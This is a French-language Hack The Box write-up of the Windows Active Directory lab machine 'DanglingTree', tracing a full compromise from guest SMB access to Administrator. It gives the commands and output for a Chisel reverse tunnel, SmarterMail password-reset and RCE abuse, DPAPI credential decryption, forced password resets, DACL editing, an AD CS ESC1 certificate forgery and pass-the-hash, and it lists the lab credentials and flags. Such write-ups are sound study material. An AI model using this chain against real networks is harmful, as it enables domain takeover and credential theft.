# Hack The Box — DanglingTree

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-brightgreen)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Active%20Directory%20%2F%20AD%20CS%20%2F%20SmarterMail-purple)

> **Active machine / private write-up.**  
> This document is kept in the private repository while the machine is active. It contains target-specific details, credentials, flags and a complete exploitation chain.

## Machine Information

| Item | Value |
|---|---|
| Machine | DanglingTree |
| Platform | Hack The Box |
| OS | Windows / Active Directory |
| Difficulty | Medium |
| Domain | `danglingtree.htb` |
| Initial Access | Guest SMB access exposed an assessment document with valid AD credentials |
| Main Pivot | Windows Admin Center access, SmarterMail takeover and RCE to `svc_mail` |
| Privilege Escalation | SmarterMail backup recovery, DPAPI credential decryption, AD ACL abuse, AD CS template abuse |
| CVEs Used | CVE-2026-23760, CVE-2026-24423 |
| Main Techniques | SMB enumeration, Windows Admin Center, Chisel tunneling, SmarterMail password reset/RCE, DPAPI, ForceChangePassword, AD CS ESC1, PKINIT, Pass-the-Hash |

## CVEs and Vulnerabilities Used

### CVE-2026-23760 — SmarterMail Authentication Bypass via Password Reset API

- **Machine:** Hack The Box — DanglingTree
- **Stage:** Application takeover / pivot to SmarterMail administration
- **Target:** SmarterMail `100.0.9504`, before build `9511`
- **Impact:** unauthenticated reset of a SmarterMail system administrator password through the password reset API.
- **Usage in DanglingTree:** after reaching the internal SmarterMail interface through the Windows Admin Center and tunnel path, the `force-reset-password` style weakness allowed control of the SmarterMail administrator account `svc_mail`.
- **Reference:** NVD — <https://nvd.nist.gov/vuln/detail/CVE-2026-23760>

### CVE-2026-24423 — SmarterMail ConnectToHub Remote Code Execution

- **Machine:** Hack The Box — DanglingTree
- **Stage:** Code execution as `svc_mail`
- **Target:** SmarterMail `100.0.9504`, before build `9511`
- **Impact:** operating system command execution through SmarterMail administrative/ConnectToHub mounting functionality.
- **Usage in DanglingTree:** SmarterMail administrative functionality was abused to execute commands on Windows and obtain a reverse shell as `danglingtree\svc_mail`.
- **Reference:** NVD — <https://nvd.nist.gov/vuln/detail/CVE-2026-24423>
- **Research reference:** VulnCheck — <https://www.vulncheck.com/blog/smartermail-connecttohub-rce-cve-2026-24423>

### Active Directory and AD CS Misconfigurations

- **Machine:** Hack The Box — DanglingTree
- **Stage:** Lateral movement and domain compromise
- **CVE:** none for this part of the chain.
- **Usage in DanglingTree:** SmarterMail backup data exposed a path to `noah.b`; DPAPI protected credentials led to `alex.o`; `ForceChangePassword` allowed control of `jake.h`; AD CS template/DACL abuse transformed the path into an ESC1-style certificate impersonation route to `Administrator`.

## Informations générales

**Machine :** DanglingTree  
**OS :** Windows Server / Active Directory Domain Controller  
**Domaine :** `danglingtree.htb`  
**DC :** `dc.danglingtree.htb`  
**IP utilisée durant l’exploitation :** `10.129.9.209`

La chaîne complète obtenue est :

```text
Guest
  ↓ SMB / IT share
anderson.w
  ↓ Windows Admin Center
SmarterMail
  ↓ RCE
svc_mail
  ↓ SmarterMail backup
noah.b
  ↓ DPAPI
alex.o
  ↓ ForceChangePassword
jake.h
  ↓ AD CS / dangling template / ESC1
Administrator
```

Les deux flags obtenus sont :

```text
user.txt
8c381ec47a65e468b31e4b5f9309e403

root.txt
c6e9d107e56c266be6f4b72c0cd2435a
```

---

## 1. Reconnaissance

On commence par ajouter le domaine dans `/etc/hosts` :

```bash
echo '10.129.9.209 dc.danglingtree.htb danglingtree.htb' | \
sudo tee -a /etc/hosts
```

Puis scan Nmap :

```bash
nmap -sC -sV -Pn 10.129.9.209
```

Les services importants étaient notamment :

```text
53      DNS
88      Kerberos
135     MSRPC
139     NetBIOS
389     LDAP
445     SMB
464     Kerberos password change
636     LDAPS
3268    Global Catalog
3269    Global Catalog SSL
3389    RDP
6600    Windows Admin Center
9389    AD Web Services
```

Cela indique immédiatement une machine fortement orientée **Active Directory**.

---

## 2. SMB : accès Guest

L'énumération SMB montre qu'un accès Guest est possible.

On découvre notamment le partage :

```text
IT
```

Dans ce partage se trouve un document lié au pentest :

```text
DanglingTree_RoE_Assessment.pdf
```

Le document contient les identifiants :

```text
DANGLINGTREE\anderson.w
R3dT3am@Acc3ss#01
```

On valide le compte :

```bash
nxc smb 10.129.9.209 \
  -u 'anderson.w' \
  -p 'R3dT3am@Acc3ss#01' \
  -d danglingtree.htb
```

Le compte est valide.

---

## 3. Anderson et Windows Admin Center

Le port :

```text
6600/tcp
```

expose Windows Admin Center :

```text
https://dc.danglingtree.htb:6600/
```

Les credentials d'Anderson fonctionnent sur WAC.

Une fois authentifié, Windows Admin Center permet d'exécuter du PowerShell sur le serveur.

Une requête typique utilise :

```http
POST /api/services/WinREST/PowerShell/nodes/dc/invokeCommand
```

avec un script PowerShell.

Par exemple :

```powershell
whoami | Out-String
```

retourne :

```text
danglingtree\anderson.w
```

Nous avons donc notre première capacité d'exécution de commandes sur le DC.

---

## 4. Énumération depuis Anderson

À ce stade, l'objectif n'est pas forcément de chercher immédiatement une privesc locale.

On cherche surtout :

```text
services locaux
applications intéressantes
ports uniquement accessibles depuis localhost
credentials
```

On identifie SmarterMail sur le serveur.

L'interface web SmarterMail écoute localement sur :

```text
127.0.0.1:17017
```

Mais ce port n'est pas directement accessible depuis Kali.

Il faut donc pivoter.

---

## 5. Tunnel Chisel vers SmarterMail

Sur Kali :

```bash
chisel server --reverse --port 8000
```

Sur la cible, on exécute Chisel via Windows Admin Center :

```powershell
$p='C:\Users\anderson.w\AppData\Local\Temp\chisel_good.exe'

Start-Process \
  -FilePath $p \
  -ArgumentList 'client 10.10.14.106:8000 R:9998:127.0.0.1:17017' \
  -WindowStyle Hidden
```

Le principe est :

```text
Kali
127.0.0.1:9998
      │
      │ tunnel Chisel
      ▼
DC
127.0.0.1:17017
```

On peut maintenant accéder à SmarterMail depuis :

```text
http://127.0.0.1:9998
```

---

## 6. SmarterMail

L'application correspond à SmarterMail :

```text
100.0.9504
```

Cette partie de la machine comporte plusieurs faiblesses intéressantes.

On découvre notamment une possibilité de réinitialiser le mot de passe du Primary System Administrator via une API de type :

```text
/api/v1/auth/force-reset-password
```

Cela nous permet de prendre le contrôle du compte applicatif :

```text
svc_mail
```

On lui définit un nouveau mot de passe pour l'interface SmarterMail :

```text
svc_mail
HtbSmarter!2026#
```

Attention :

```text
HtbSmarter!2026#
```

est à ce moment-là le mot de passe **SmarterMail**, pas nécessairement son mot de passe Active Directory.

---

## 7. RCE SmarterMail → svc_mail

En exploitant les fonctionnalités administratives de SmarterMail, notamment celles permettant de manipuler les montages / commandes liées aux nœuds de l'application, nous obtenons une exécution de commandes sur Windows.

Notre reverse shell retourne :

```text
danglingtree\svc_mail
```

On vient donc de passer de :

```text
anderson.w
```

à :

```text
svc_mail
```

Mais ce n'est toujours pas Administrator.

---

## 8. Mot de passe Active Directory de svc_mail

En analysant les fichiers et la logique de chiffrement de SmarterMail, nous trouvons une valeur chiffrée liée au compte :

```text
+I0tr+tzYqGdGi6H0Yu+4w==
```

ainsi qu'une clé utilisée par l'application :

```text
a3oij89FF!apoife
```

Le déchiffrement donne :

```text
OceanWave#9Sky!
```

Nous testons alors :

```bash
nxc ldap 10.129.9.209 \
  -u 'svc_mail' \
  -p 'OceanWave#9Sky!' \
  -d danglingtree.htb
```

Résultat :

```text
[+]
```

Donc :

```text
DANGLINGTREE\svc_mail
OceanWave#9Sky!
```

sont bien des credentials Active Directory valides.

---

## 9. L'erreur d'énumération importante

À ce stade, nous avions commencé à faire beaucoup d'énumération Windows générale :

```text
services
scheduled tasks
privileges
profiles
ProgramData
PowerShell history
etc.
```

Mais la meilleure stratégie aurait été de continuer à énumérer **verticalement l'application SmarterMail**, puisque c'est elle qui nous avait donné le nouveau compte.

Le répertoire intéressant était :

```text
C:\SmarterMail\Domains
```

On y trouve :

```text
danglingtree.htb
danglingtree.htb.bak
```

Le `.bak` est extrêmement intéressant.

Il représente une ancienne copie du domaine SmarterMail.

---

## 10. Découverte de Noah

Dans :

```text
C:\SmarterMail\Domains\danglingtree.htb.bak\Users
```

on trouve plusieurs utilisateurs.

Notamment :

```text
noah.b
```

Puis :

```text
C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b\settings.json
```

contient :

```json
{
  "account_name": "noah.b",
  "password_encrypted": "66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
}
```

Le déchiffrement permet d'obtenir :

```text
noah.b
RiverDragon#Storm25
```

On valide le credential :

```bash
nxc ldap 10.129.9.209 \
  -u 'noah.b' \
  -p 'RiverDragon#Storm25' \
  -d danglingtree.htb
```

Résultat :

```text
[+]
```

---

## 11. Obtenir une session Noah

Nous avons déjà une session `svc_mail`.

Une première idée est d'utiliser :

```powershell
Start-Process -Credential
```

mais cela échoue avec :

```text
Access is denied
```

Nous utilisons donc l'API Windows :

```text
LogonUser()
```

puis :

```text
ImpersonateLoggedOnUser()
```

Le principe est :

```text
svc_mail process
       │
       │ LogonUser(noah.b, password)
       ▼
token Windows de Noah
       │
       │ ImpersonateLoggedOnUser
       ▼
thread exécuté comme noah.b
```

Après l'impersonation :

```powershell
[Security.Principal.WindowsIdentity]::GetCurrent().Name
```

retourne :

```text
DANGLINGTREE\noah.b
```

Nous pouvons alors lire directement :

```powershell
Get-Content 'C:\Users\noah.b\Desktop\user.txt'
```

Résultat :

```text
8c381ec47a65e468b31e4b5f9309e403
```

Nous avons le **user flag**.

---

## 12. Après user.txt : recherche de la vraie privesc

Il est important de comprendre que nous n'avons pas commencé à chercher immédiatement :

```text
kernel exploit
service vulnérable
SeImpersonatePrivilege
```

Car nous sommes sur un environnement Active Directory.

Nous cherchons plutôt :

```text
credentials appartenant à Noah
droits AD
secrets DPAPI
```

En inspectant le profil Noah, nous trouvons :

```text
C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials
```

avec :

```text
57FFB67D684C67F09E7153B9C7CC3940
```

ainsi que :

```text
C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\
S-1-5-21-4220238332-57023728-1129110646-1602\
f53fcaba-f057-48e8-8f92-0180d274bf0f
```

Cela indique **DPAPI**.

---

## 13. Comprendre DPAPI

Windows DPAPI protège des secrets appartenant à un utilisateur.

Schéma simplifié :

```text
Password de Noah
       │
       ▼
DPAPI MasterKey
       │
       ▼
Credential Blob
       │
       ▼
credential en clair
```

Comme nous connaissons déjà :

```text
RiverDragon#Storm25
```

nous avons tout ce qu'il faut pour essayer de déchiffrer la MasterKey.

On copie :

```text
noah.masterkey
noah.cred
```

vers Kali.

---

## 14. Déchiffrement de la MasterKey

On lance :

```bash
dpapi.py masterkey \
  -file noah.masterkey \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-1602' \
  -password 'RiverDragon#Storm25'
```

On obtient :

```text
Decrypted key:
0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
```

La MasterKey DPAPI est maintenant déchiffrée.

---

## 15. Déchiffrement du Credential Blob

On utilise cette clé :

```bash
dpapi.py credential \
  -file noah.cred \
  -key 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
```

Résultat :

```text
Username : alex.o
Password : SunsetMountainPeak@2025
Target   : PC01.danglingtree.htb
```

Nous avons donc un nouveau compte :

```text
alex.o
SunsetMountainPeak@2025
```

Validation :

```bash
nxc ldap 10.129.9.209 \
  -u 'alex.o' \
  -p 'SunsetMountainPeak@2025' \
  -d danglingtree.htb
```

Résultat :

```text
[+]
```

---

## 16. Énumération Active Directory d'Alex

Maintenant la question est :

> Que peut faire Alex que Noah ne pouvait pas faire ?

L'énumération des groupes et ACL montre :

```text
alex.o
  │
  └── membre de support-it
```

Et :

```text
support-it
   │
   └── ForceChangePassword
             │
             ▼
           jake.h
```

On a donc :

```text
alex.o
   ↓
support-it
   ↓
ForceChangePassword
   ↓
jake.h
```

---

## 17. Abuse ForceChangePassword

`ForceChangePassword` signifie qu'Alex peut **réinitialiser** le password de Jake sans connaître l'ancien mot de passe.

Nous choisissons :

```text
Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan
```

Commande :

```bash
impacket-changepasswd \
  'danglingtree.htb/jake.h@10.129.9.209' \
  -newpass 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -altuser 'alex.o' \
  -altpass 'SunsetMountainPeak@2025' \
  -reset \
  -protocol ldap
```

Puis :

```bash
nxc ldap 10.129.9.209 \
  -u 'jake.h' \
  -p 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -d danglingtree.htb
```

Résultat :

```text
[+]
```

Nous contrôlons maintenant :

```text
jake.h
```

---

## 18. Pourquoi Jake est important

L'énumération montre que Jake appartient notamment à :

```text
Helpdesk_Cert_Support
Template_Editors
DevOps_PKI
```

Ce sont immédiatement des noms suspects dans un environnement utilisant :

```text
Active Directory Certificate Services
```

Les droits observés sont particulièrement intéressants.

Jake via :

```text
Helpdesk_Cert_Support
```

possède :

```text
ManageCertificates
```

sur la CA :

```text
danglingtree-DC-CA
```

Et via :

```text
Template_Editors
```

il possède des droits sur le conteneur :

```text
CN=Certificate Templates,
CN=Public Key Services,
CN=Services,
CN=Configuration,
DC=danglingtree,
DC=htb
```

---

## 19. Énumération AD CS avec Certipy

On lance :

```bash
certipy-ad find \
  -u 'jake.h@danglingtree.htb' \
  -p 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -dc-ip 10.129.9.209 \
  -vulnerable \
  -stdout
```

On obtient la CA :

```text
CA Name : danglingtree-DC-CA
DNS Name: dc.danglingtree.htb
```

On voit notamment :

```text
Enroll:
Authenticated Users

ManageCertificates:
Helpdesk_Cert_Support
```

Certipy indique :

```text
ESC7 : User has dangerous permissions
```

Mais il retourne surtout :

```text
[!] Could not find any certificate templates
```

C'est anormal.

---

## 20. Comprendre le vrai indice de DanglingTree

Plutôt que de supposer que Certipy est simplement cassé, nous interrogeons directement LDAP.

On demande quels templates sont **publiés par la CA** :

```bash
LDAPTLS_REQCERT=never ldapsearch -LLL -x \
  -H ldaps://10.129.9.209:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(objectClass=pKIEnrollmentService)' \
  cn certificateTemplates
```

Nous voyons :

```text
certificateTemplates: RemoteAccessVPN
certificateTemplates: EmployeeAuthTemplate
certificateTemplates: VPNUserTemplate
...
```

Maintenant on cherche les vrais objets de templates présents dans l'AD :

```bash
LDAPTLS_REQCERT=never ldapsearch -LLL -x \
  -H ldaps://10.129.9.209:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  '(objectClass=pKICertificateTemplate)' \
  cn displayName
```

On retrouve :

```text
User
Machine
Administrator
WebServer
SubCA
...
```

mais PAS :

```text
EmployeeAuthTemplate
VPNUserTemplate
RemoteAccessVPN
```

Nous venons de comprendre le nom :

## DanglingTree

La CA contient encore une référence vers :

```text
EmployeeAuthTemplate
```

mais l'objet LDAP correspondant a été supprimé.

C'est une **dangling reference**.

Schéma :

```text
danglingtree-DC-CA
       │
       ├── publie "EmployeeAuthTemplate"
       │
       └──────► objet LDAP inexistant
```

---

## 21. Pourquoi cela est exploitable avec Jake

Nous savons que Jake possède :

```text
CreateChild
```

sur le conteneur des Certificate Templates.

Il peut donc créer un nouvel objet :

```text
CN=EmployeeAuthTemplate
```

exactement avec le nom que la CA publie toujours.

On crée un LDIF :

```bash
cat > EmployeeAuthTemplate.ldif <<'EOF'
dn: CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
changetype: add
objectClass: top
objectClass: pKICertificateTemplate
cn: EmployeeAuthTemplate
displayName: EmployeeAuthTemplate
revision: 100
msPKI-Template-Schema-Version: 2
msPKI-Template-Minor-Revision: 0
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.20260812.1103.1
EOF
```

Puis :

```bash
LDAPTLS_REQCERT=never ldapadd -x \
  -H ldaps://10.129.9.209:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -f EmployeeAuthTemplate.ldif
```

Résultat :

```text
adding new entry
"CN=EmployeeAuthTemplate,CN=Certificate Templates,..."
```

Le dangling object a été recréé.

---

## 22. Vérification

On confirme :

```bash
LDAPTLS_REQCERT=never ldapsearch -LLL -x \
  -H ldaps://10.129.9.209:636 \
  -D 'jake.h@danglingtree.htb' \
  -w 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -b 'CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  -s base \
  '(objectClass=*)' \
  cn displayName msPKI-Cert-Template-OID
```

Résultat :

```text
cn: EmployeeAuthTemplate
displayName: EmployeeAuthTemplate
msPKI-Cert-Template-OID: ...
```

---

## 23. Première tentative de transformation en ESC1

On essaie :

```bash
certipy-ad template \
  -u 'jake.h@danglingtree.htb' \
  -p 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -dc-ip 10.129.9.209 \
  -template 'EmployeeAuthTemplate' \
  -write-default-configuration 'S-1-5-11' \
  -no-save \
  -force
```

Mais :

```text
User 'JAKE.H' doesn't have permission
to update these attributes
```

Pourquoi ?

Parce que :

```text
CreateChild != FullControl
```

Jake pouvait créer l'objet, mais pas nécessairement modifier tous ses attributs.

---

## 24. Abuse de la DACL

Nous modifions donc la DACL du template afin d'accorder à Jake :

```text
FullControl
```

Commande :

```bash
impacket-dacledit \
  -action write \
  -rights FullControl \
  -principal 'jake.h' \
  -target-dn 'CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  -dc-ip 10.129.9.209 \
  -use-ldaps \
  'danglingtree.htb/jake.h:Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan'
```

Résultat :

```text
DACL backed up to ...
DACL modified successfully!
```

Conceptuellement :

```text
avant :

Jake
 └── CreateChild

après :

Jake
 └── FullControl
       ├── WriteProperty
       ├── WriteDACL
       ├── Modify attributes
       └── etc.
```

---

## 25. Transformation du template en ESC1

On relance :

```bash
certipy-ad template \
  -u 'jake.h@danglingtree.htb' \
  -p 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -dc-ip 10.129.9.209 \
  -template 'EmployeeAuthTemplate' \
  -write-default-configuration 'S-1-5-11' \
  -no-save \
  -force
```

Cette fois :

```text
Successfully updated 'EmployeeAuthTemplate'
```

Certipy ajoute notamment :

```text
Client Authentication EKU
ENROLLEE_SUPPLIES_SUBJECT
Authenticated Users enrollment
```

Le template est maintenant exploitable en :

```text
ESC1
```

---

## 26. Comprendre ESC1

Normalement :

```text
jake.h demande certificat
          ↓
certificat pour jake.h
```

Mais avec :

```text
ENROLLEE_SUPPLIES_SUBJECT
```

le demandeur peut fournir l'identité contenue dans le certificat.

Donc Jake peut demander :

```text
UPN = administrator@danglingtree.htb
```

Le certificat a en plus :

```text
Client Authentication
```

Il peut donc servir pour une authentification Active Directory.

---

## 27. Strong Certificate Mapping

Sur cette machine, fournir uniquement :

```text
administrator@danglingtree.htb
```

n'est pas suffisant.

Nous ajoutons également le SID du compte Administrator.

Le SID du domaine est :

```text
S-1-5-21-4220238332-57023728-1129110646
```

Administrator a le RID :

```text
500
```

Donc :

```text
S-1-5-21-4220238332-57023728-1129110646-500
```

Cela permet au DC de faire un mapping fort entre :

```text
certificat
  ↓
SID
  ↓
Administrator
```

---

## 28. Demande du certificat Administrator

Première tentative RPC :

```bash
certipy-ad req \
  -u 'jake.h@danglingtree.htb' \
  -p 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -dc-ip 10.129.9.209 \
  -target-ip 10.129.9.209 \
  -ca 'danglingtree-DC-CA' \
  -template 'EmployeeAuthTemplate' \
  -upn 'administrator@danglingtree.htb' \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
  -out 'admin-esc1-sid'
```

Échec :

```text
NETBIOS connection with the remote host timed out
```

On essaie RPC dynamique :

```text
-dynamic-endpoint
```

Encore :

```text
timed out
```

Cela ne remet pas en cause ESC1.

C'est simplement le transport RPC qui pose problème.

---

## 29. DCOM Enrollment

On utilise alors DCOM :

```bash
certipy-ad req \
  -u 'jake.h@danglingtree.htb' \
  -p 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan' \
  -dc-ip 10.129.9.209 \
  -target-ip 10.129.9.209 \
  -ca 'danglingtree-DC-CA' \
  -template 'EmployeeAuthTemplate' \
  -upn 'administrator@danglingtree.htb' \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
  -out 'admin-esc1-sid' \
  -dcom
```

Cette fois :

```text
Request ID is 19

Successfully requested certificate

Got certificate with UPN:
administrator@danglingtree.htb

Certificate object SID:
S-1-5-21-4220238332-57023728-1129110646-500

Saving certificate and private key to:
admin-esc1-sid.pfx
```

Nous avons maintenant :

```text
admin-esc1-sid.pfx
```

contenant :

```text
certificat Administrator
+
clé privée
```

---

## 30. Synchronisation du temps

Avant PKINIT, il faut penser à Kerberos.

La machine possède un clock skew important.

Notre différence était environ :

```text
699 secondes
```

On synchronise :

```bash
sudo timedatectl set-ntp false
sudo ntpdate 10.129.9.209
```

Résultat :

```text
CLOCK: time stepped by 698.931843
```

---

## 31. PKINIT : certificat → Administrator

Nous utilisons maintenant Certipy :

```bash
certipy-ad auth \
  -pfx admin-esc1-sid.pfx \
  -dc-ip 10.129.9.209 \
  -username administrator \
  -domain danglingtree.htb
```

Certipy lit le certificat :

```text
SAN UPN:
administrator@danglingtree.htb

SAN URL SID:
S-1-5-21-4220238332-57023728-1129110646-500

Security Extension SID:
S-1-5-21-4220238332-57023728-1129110646-500
```

Puis :

```text
Trying to get TGT...
Got TGT
```

Le DC vient donc d'accepter notre certificat comme preuve que nous sommes :

```text
Administrator
```

Certipy écrit :

```text
administrator.ccache
```

---

## 32. Récupération du NT hash

Certipy continue ensuite automatiquement :

```text
Trying to retrieve NT hash for 'administrator'
```

Puis :

```text
Got hash for administrator@danglingtree.htb:

aad3b435b51404eeaad3b435b51404ee:
8cacb3a97e460c65d105ca7cd9913925
```

Le NT hash est :

```text
8cacb3a97e460c65d105ca7cd9913925
```

La privesc est terminée.

Nous sommes Administrator.

---

## 33. Accès au filesystem Administrator

Nous avons utilisé :

```bash
impacket-smbclient \
  -hashes aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925 \
  'danglingtree.htb/administrator@10.129.9.209'
```

Puis :

```text
use C$
cd Users\Administrator\Desktop
ls
get root.txt
```

Sur Kali :

```bash
cat root.txt
```

Résultat :

```text
c6e9d107e56c266be6f4b72c0cd2435a
```

Machine terminée.

---

## 34. Alternative avec smbclient classique

`impacket-smbclient` n'était pas indispensable.

On pouvait également utiliser Samba directement avec Pass-the-Hash :

```bash
smbclient '//10.129.9.209/C$' \
  -U 'danglingtree.htb/administrator%8cacb3a97e460c65d105ca7cd9913925' \
  --pw-nt-hash
```

Puis :

```text
cd Users\Administrator\Desktop
get root.txt
```

Et comme Certipy avait également généré :

```text
administrator.ccache
```

nous aurions même pu rester entièrement en Kerberos au lieu d'utiliser le NT hash.

---

## 35. La vraie méthode de privilege escalation

La partie importante de DanglingTree n'est pas une privesc Windows locale classique.

Nous n'avons pas fait :

```text
user
 ↓
service vulnérable
 ↓
SYSTEM
```

Nous avons fait une **chaîne de privilèges Active Directory** :

```text
noah.b
   │
   │ DPAPI credential harvesting
   ▼
alex.o
   │
   │ ForceChangePassword
   ▼
jake.h
   │
   │ PKI permissions
   ▼
Certificate Templates
   │
   │ dangling object
   ▼
EmployeeAuthTemplate
   │
   │ WriteDACL / FullControl
   ▼
ESC1
   │
   │ certificate impersonation
   ▼
Administrator
```

Il y a donc deux types de mouvements.

### Mouvement horizontal

```text
Noah
 ↓
Alex
 ↓
Jake
```

Nous ne devenons pas encore administrateur ; nous passons d'un compte à un autre en récupérant progressivement davantage de droits.

### Mouvement vertical

```text
Jake
 ↓
AD CS
 ↓
Administrator
```

Jake possède des droits PKI qui permettent finalement de fabriquer une identité cryptographique Administrator.

---

## 36. Pourquoi le nom DanglingTree ?

Probablement à cause du cœur de la dernière exploitation.

La CA possède :

```text
certificateTemplates: EmployeeAuthTemplate
```

mais l'arbre LDAP :

```text
CN=Certificate Templates,...
```

ne contient plus :

```text
CN=EmployeeAuthTemplate
```

La CA possède donc une référence vers un objet qui n'existe plus :

```text
CA
 │
 └────── EmployeeAuthTemplate
                   │
                   X
              objet disparu
```

Comme Jake possède `CreateChild`, il peut recréer lui-même cet objet.

La CA commence ensuite à utiliser un template que **nous contrôlons**.

C'est cette combinaison qui rend la machine particulièrement intéressante :

```text
dangling reference
+
CreateChild
+
WriteDACL
+
AD CS
+
ESC1
```

---

## 37. Les erreurs qui nous ont appris quelque chose

## `Start-Process -Credential` échoue

```text
Access is denied
```

Cela nous a poussé à utiliser :

```text
LogonUser
+
ImpersonateLoggedOnUser
```

pour Noah.

---

## Certipy ne trouve aucun template

```text
Could not find any certificate templates
```

Au lieu de simplement abandonner, nous avons comparé :

```text
templates publiés par la CA
```

avec :

```text
objets réellement présents dans LDAP
```

C'est ainsi que nous avons découvert la vulnérabilité principale.

---

## Certipy ne peut pas modifier EmployeeAuthTemplate

```text
JAKE.H doesn't have permission
```

Cela nous a appris que :

```text
CreateChild != FullControl
```

On a donc abusé de la DACL avec :

```text
impacket-dacledit
```

---

## RPC certificate enrollment timeout

```text
NETBIOS connection timed out
```

et :

```text
dynamic endpoint timed out
```

Le template n'était pas cassé.

Nous avons simplement changé de transport :

```text
RPC ❌
DCOM ✅
```

---

## Kerberos clock skew

Même avec un certificat Administrator valide, PKINIT aurait pu échouer si Kali et le DC n'avaient pas des horloges suffisamment proches.

D'où :

```bash
sudo ntpdate 10.129.9.209
```

---

## 38. Ce qu'il faut retenir pour une autre machine AD

Après avoir obtenu un utilisateur sur une machine Active Directory, la question ne doit pas toujours être :

```text
Comment devenir SYSTEM localement ?
```

Il faut également regarder :

```text
Que peut lire cet utilisateur ?
        ↓
DPAPI / credentials ?

À quels groupes appartient le nouveau compte ?
        ↓
groupes intéressants ?

Quelles ACL peut-il exploiter ?
        ↓
ForceChangePassword ?
GenericAll ?
WriteDACL ?
WriteOwner ?
CreateChild ?

AD CS existe-t-il ?
        ↓
CA ?
templates ?
ManageCA ?
ManageCertificates ?
Enrollment ?
ESC1 / ESC4 / ESC7 ?

La configuration de la CA correspond-elle réellement
aux objets présents dans LDAP ?
```

Dans DanglingTree, cette méthodologie nous aurait naturellement donné :

```text
Noah
 │
 ├─ DPAPI ?
 │     └─ Oui → Alex
 │
Alex
 │
 ├─ ACL intéressante ?
 │     └─ ForceChangePassword → Jake
 │
Jake
 │
 ├─ groupes intéressants ?
 │     └─ PKI / Template_Editors
 │
AD CS
 │
 ├─ anomalie ?
 │     └─ templates publiés mais inexistants
 │
Jake
 │
 ├─ peut recréer le template ?
 │     └─ Oui, CreateChild
 │
Template
 │
 ├─ peut-il le contrôler ?
 │     └─ DACL → FullControl
 │
ESC1
 │
 ├─ peut-on impersonate Administrator ?
 │     └─ Oui, UPN + SID
 │
PKINIT
 │
 └─ Administrator
```

---

## 39. Chaîne finale condensée

```text
[Guest]
   |
   | SMB IT share
   v
[anderson.w]
   |
   | Windows Admin Center
   | Chisel
   v
[SmarterMail]
   |
   | password reset + RCE
   v
[svc_mail]
   |
   | backup SmarterMail
   v
[noah.b]
   |
   | LogonUser / Impersonation
   | user.txt
   |
   | DPAPI
   v
[alex.o]
   |
   | support-it
   | ForceChangePassword
   v
[jake.h]
   |
   | Template_Editors
   | CreateChild
   v
[EmployeeAuthTemplate recreated]
   |
   | WriteDACL
   | FullControl
   v
[ESC1]
   |
   | UPN administrator
   | SID ...-500
   | DCOM Enrollment
   v
[Administrator certificate]
   |
   | PKINIT
   v
[Administrator TGT + NT hash]
   |
   | SMB C$
   v
[root.txt]
```

## Credentials obtenus au cours de la machine

```text
anderson.w
R3dT3am@Acc3ss#01

svc_mail (SmarterMail)
HtbSmarter!2026#

svc_mail (Active Directory)
OceanWave#9Sky!

noah.b
RiverDragon#Storm25

alex.o
SunsetMountainPeak@2025

jake.h
Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan

Administrator NT hash
8cacb3a97e460c65d105ca7cd9913925
```

## Flags

```text
user.txt
8c381ec47a65e468b31e4b5f9309e403

root.txt
c6e9d107e56c266be6f4b72c0cd2435a
```

---

## Conclusion

DanglingTree est intéressante parce que la difficulté ne vient pas d'un exploit unique.

La machine oblige à comprendre plusieurs couches :

```text
SMB
Windows Admin Center
tunneling
SmarterMail
Windows impersonation
DPAPI
Active Directory ACLs
ForceChangePassword
AD CS
Certificate Templates
DACL
ESC1
PKINIT
Pass-the-Hash
```

La partie la plus importante est probablement la fin :

```text
CA publie EmployeeAuthTemplate
        +
objet EmployeeAuthTemplate absent
        +
Jake peut CreateChild
        =
possibilité de recréer le dangling template
```

Puis :

```text
WriteDACL
